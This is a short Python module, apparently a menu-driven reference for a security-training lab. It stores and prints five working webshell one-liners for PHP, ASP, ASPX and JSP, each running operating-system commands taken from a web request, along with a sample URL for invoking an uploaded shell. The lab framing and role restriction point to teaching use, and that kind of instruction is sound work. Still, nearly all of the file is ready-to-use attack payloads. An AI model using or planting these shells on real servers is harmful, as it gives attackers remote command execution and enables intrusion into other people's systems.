NAME = "Webshell Reference"
DESCRIPTION = "Common minimal webshell one-liners (display only)."
ALLOWED_ROLES = ["admin", "instructor"]

SHELLS = {
    "1": ("PHP (system)", "<?php system($_GET['cmd']); ?>"),
    "2": ("PHP (passthru)", "<?php passthru($_REQUEST['c']); ?>"),
    "3": ("ASP", "<% eval request(\"cmd\") %>"),
    "4": ("ASPX", "<%@ Page Language=\"C#\" %><% "
          "System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"c\"]); %>"),
    "5": ("JSP", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
}


def run(username, role):
    print("[*] For authorized lab upload exercises only.")
    print("\nAvailable references:")
    for key, (name, _) in SHELLS.items():
        print(f"  {key}. {name}")
    choice = input("Select: ").strip()

    if choice not in SHELLS:
        print("[!] Invalid choice.")
        return

    name, code = SHELLS[choice]
    print(f"\n--- {name} ---")
    print(code)
    print("\nUsage pattern after upload (lab):")
    print("  http://lab-target/uploads/shell.php?cmd=id")
